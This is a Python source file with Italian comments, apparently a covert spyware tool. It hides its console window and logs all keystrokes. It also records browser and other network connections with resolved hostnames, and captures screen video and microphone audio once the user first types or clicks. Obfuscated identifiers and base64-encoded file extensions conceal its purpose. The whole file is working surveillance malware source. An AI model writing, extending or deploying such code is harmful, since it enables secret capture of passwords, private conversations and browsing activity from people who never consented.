import os
import random
import string
import psutil
import threading
import time
from pynput import keyboard, mouse
from datetime import datetime
import sys
import socket
import cv2
import mss
import numpy as np
import sounddevice as sd
import wavio
import base64

# Variabili globali per il controllo dei thread e dello stato di registrazione
_s_r_t = None  # screen_recorder_thread
_a_r_t = None  # audio_recorder_thread
_s_e = threading.Event()  # stop_event
_t_e = threading.Event()  # trigger_event
_r_s_f = False  # recording_started_flag

_o_v_p = None  # output_video_path
_v_w = None  # video_writer
_r_f_b = None  # recording_base_folder

_a_f_p = None  # audio_file_path
_a_f = []  # audio_frames
_a_s_r = 44100  # audio_samplerate
_a_c = 2  # audio_channels

# Nascondi la console su Windows
if os.name == 'nt':
    import ctypes
    _h_w = ctypes.windll.kernel32.GetConsoleWindow()
    if _h_w:
        ctypes.windll.user32.ShowWindow(_h_w, 0)

# Funzione per generare timestamp
def _g_t(): # generate_timestamp
    return datetime.now().strftime("%y-%m-%d-%H-%M-%S")

# Funzione per generare nomi di cartelle datate
def _g_d_f(): # generate_dated_folder
    return datetime.now().strftime("%Y-%m-%d")

# Nomi dei file di log (offuscati e con timestamp)
_k_l_f = os.path.join(os.getcwd(), f"k_log_{_g_t()}.{base64.b64decode(b'aW5mbw==').decode()}") # keyboard_log_file .info
_w_a_l_f = os.path.join(os.getcwd(), f"w_a_log_{_g_t()}.{base64.b64decode(b'aW5mbw==').decode()}") # web_activity_log_file .info

# Inizializza i file di log
with open(_k_l_f, "w", encoding="utf-8") as f:
    f.write(f"Session started: {datetime.now()}\n{'-'*40}\n")
with open(_w_a_l_f, "w", encoding="utf-8") as f:
    f.write(f"Web Activity Log started: {datetime.now()}\n{'-'*40}\n")

# Funzione per loggare l'attività della tastiera
def _l_a(msg): # log_activity
    with open(_k_l_f, "a", encoding="utf-8") as f:
        f.write(f"{msg}\n")

# Funzione per loggare l'attività web
def _l_w_a(msg): # log_web_activity
    with open(_w_a_l_f, "a", encoding="utf-8") as f:
        f.write(f"{msg}\n")

# Funzione per avviare la registrazione (video e audio)
def _s_a_r_c(): # start_all_recording_components
    global _s_r_t, _a_r_t, _r_s_f, _r_f_b

    if not _r_s_f:
        # Crea la cartella base per le registrazioni
        _r_f_b = os.path.join(os.getcwd(), base64.b64decode(b'cmVjb3JkaW5ncw==').decode()) # "recordings"
        os.makedirs(_r_f_b, exist_ok=True)

        # Avvia il thread di registrazione schermo
        _s_r_t = threading.Thread(target=_r_s, daemon=True) # record_screen
        _s_r_t.start()

        # Avvia il thread di registrazione audio
        _a_r_t = threading.Thread(target=_a_r, daemon=True) # audio_recorder
        _a_r_t.start()

        _r_s_f = True
        _t_e.set() # Segnala ai recorder che possono iniziare

# Listener della tastiera
def _k_l(): # keyboard_listener
    from pynput.keyboard import Key, Listener

    _s = { # specials
        Key.space: "[SPACE]", Key.enter: "[ENTER]", Key.tab: "[TAB]",
        Key.backspace: "[BACKSPACE]", Key.shift: "[SHIFT]", Key.shift_r: "[SHIFT_R]",
        Key.ctrl: "[CTRL]", Key.ctrl_r: "[CTRL_R]", Key.alt: "[ALT]",
        Key.alt_r: "[ALT_R]", Key.caps_lock: "[CAPSLOCK]", Key.esc: "[ESC]",
        Key.up: "[UP]", Key.down: "[DOWN]", Key.left: "[LEFT]", Key.right: "[RIGHT]"
    }

    def _o_p(key): # on_press
        global _r_s_f
        if not _r_s_f:
            _s_a_r_c() # Avvia la registrazione al primo tasto premuto

        try:
            _k = key.char # k
            _m = f"[{datetime.now().strftime('%H:%M:%S')}] Key pressed: '{_k}'" # msg
        except AttributeError:
            _m = f"[{datetime.now().strftime('%H:%M:%S')}] Key pressed: {_s.get(key, str(key))}"
        _l_a(_m)

    with Listener(on_press=_o_p) as listener:
        listener.join()

# Listener del mouse (solo per trigger)
def _m_l(): # mouse_listener
    from pynput import mouse

    def _o_c(x, y, button, pressed): # on_click
        global _r_s_f
        if pressed and not _r_s_f:
            _s_a_r_c() # Avvia la registrazione al primo clic del mouse

    with mouse.Listener(on_click=_o_c) as listener:
        listener.join()

# Web Activity Sniffer
def _w_a_s(): # web_activity_sniffer
    _o_c = set() # old_conns
    _b_n = [ # browser_names
        "chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe", "brave.exe", "opera.exe"
    ]
    while True:
        try:
            _c_c = set() # current_conns
            for conn in psutil.net_connections(kind='inet'):
                if conn.status == 'ESTABLISHED' and conn.laddr and conn.raddr:
                    _p_id = conn.pid or 0 # pid
                    _p_n = "N/A" # process_name
                    _r_i = conn.raddr.ip # remote_ip

                    _h_n = "N/A" # hostname
                    try:
                        _p = psutil.Process(_p_id) # process
                        _p_n = _p.name()

                        # Tenta di risolvere l'IP remoto al nome host
                        _h_n = socket.gethostbyaddr(_r_i)[0]
                    except (psutil.NoSuchProcess, psutil.AccessDenied, socket.herror):
                        pass
                    except Exception:
                        pass

                    _k = (_p_id, conn.laddr, conn.raddr, _h_n) # key
                    _c_c.add(_k)

                    if _k not in _o_c:
                        _is_b = "No"
                        if any(b_name in _p_n.lower() for b_name in _b_n):
                            _is_b = "Yes"

                        _m = ( # msg
                            f"[{datetime.now().strftime('%H:%M:%S')}] ; "
                            f"Process ID: {_p_id} ; "
                            f"Process Name: {_p_n} ; "
                            f"Is Browser: {_is_b} ; "
                            f"Remote Host: {_h_n} ; "
                            f"Remote IP: {_r_i}"
                        )
                        _l_w_a(_m)
            _o_c = _c_c
            time.sleep(1)
        except Exception as e:
            pass

# Registrazione schermo in background
def _r_s(): # record_screen
    global _v_w, _o_v_p, _r_f_b

    _t_e.wait() # Attende il trigger per iniziare la registrazione

    _d_f = os.path.join(_r_f_b, _g_d_f()) # dated_folder
    os.makedirs(_d_f, exist_ok=True)

    _o_v_p = os.path.join(_d_f, f"screen_{_g_t()}.{base64.b64decode(b'YXZp').decode()}") # .avi

    with mss.mss() as sct:
        _m = sct.monitors[1] # monitor

    _f = cv2.VideoWriter_fourcc(*'XVID') # fourcc
    _fps = 10.0 # fps
    _w = _m["width"] # width
    _h = _m["height"] # height
    
    _v_w = cv2.VideoWriter(_o_v_p, _f, _fps, (_w, _h))

    if not _v_w.isOpened():
        return

    try:
        with mss.mss() as sct:
            while not _s_e.is_set():
                try:
                    _s_i = sct.grab(_m) # sct_img
                    _f_r = np.array(_s_i) # frame
                    _f_r = cv2.cvtColor(_f_r, cv2.COLOR_RGBA2BGR) 
                    _v_w.write(_f_r)
                    time.sleep(1 / _fps)
                except Exception as e:
                    pass
    finally:
        if _v_w:
            _v_w.release()

# Registrazione audio in background
def _a_r(): # audio_recorder
    global _a_f, _a_f_p, _a_s_r, _a_c, _r_f_b

    _t_e.wait() # Attende il trigger per iniziare la registrazione

    _d_f = os.path.join(_r_f_b, _g_d_f()) # dated_folder
    os.makedirs(_d_f, exist_ok=True)

    _a_f_p = os.path.join(_d_f, f"audio_{_g_t()}.{base64.b64decode(b'd2F2').decode()}") # .wav

    def _c(indata, frames, time_info, status): # callback
        if status:
            pass
        _a_f.append(indata.copy())

    try:
        with sd.InputStream(samplerate=_a_s_r, channels=_a_c, callback=_c):
            _s_e.wait() # Attende l'evento di stop
    except Exception as e:
        pass
    finally:
        if _a_f:
            wavio.write(_a_f_p, np.concatenate(_a_f), _a_s_r, sampwidth=2)

# Avvio dei thread principali
if __name__ == "__main__":
    # Avvia i listener di tastiera e mouse (che attiveranno la registrazione)
    threading.Thread(target=_k_l, daemon=True).start()
    threading.Thread(target=_m_l, daemon=True).start()

    # Avvia il web activity sniffer
    threading.Thread(target=_w_a_s, daemon=True).start()

    try:
        while True:
            time.sleep(1) # Mantiene il thread principale attivo
    except KeyboardInterrupt:
        _s_e.set() # Segnala a tutti i thread di registrazione di fermarsi
        if _s_r_t and _s_r_t.is_alive():
            _s_r_t.join(timeout=5)
        if _a_r_t and _a_r_t.is_alive():
            _a_r_t.join(timeout=5)
    except Exception as e:
        _s_e.set()
        if _s_r_t and _s_r_t.is_alive():
            _s_r_t.join(timeout=5)
        if _a_r_t and _a_r_t.is_alive():
            _a_r_t.join(timeout=5)
